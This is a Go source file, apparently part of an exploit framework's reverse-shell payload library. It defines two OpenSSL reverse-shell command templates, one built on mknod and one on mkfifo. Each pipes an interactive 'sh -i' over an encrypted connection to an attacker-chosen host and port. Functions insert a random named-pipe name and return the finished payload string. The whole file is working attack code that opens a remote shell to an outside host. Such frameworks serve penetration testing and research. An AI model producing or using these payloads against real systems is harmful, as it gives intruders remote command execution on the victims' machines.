package reverse

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

const (
	OpenSSLDefault = OpenSSLMknod
	OpenSSLMknod   = `cd /tmp; mknod %s p; sh -i < %s 2>&1 | openssl s_client -quiet -connect %s:%d > %s; rm %s;`
	OpenSSLMkfifo  = `cd /tmp; mkfifo %s; sh -i < %s 2>&1 | openssl s_client -quiet -connect %s:%d > %s; rm %s;`
)

func (openssl *OpenSSLPayload) Default(lhost string, lport int) string {
	return openssl.Mknod(lhost, lport)
}

func (openssl *OpenSSLPayload) Mknod(lhost string, lport int) string {
	node := random.RandLetters(3)

	return fmt.Sprintf(OpenSSLDefault, node, node, lhost, lport, node, node)
}

func (openssl *OpenSSLPayload) Mkfifo(lhost string, lport int) string {
	fifo := random.RandLetters(3)

	return fmt.Sprintf(OpenSSLMkfifo, fifo, fifo, lhost, lport, fifo, fifo)
}
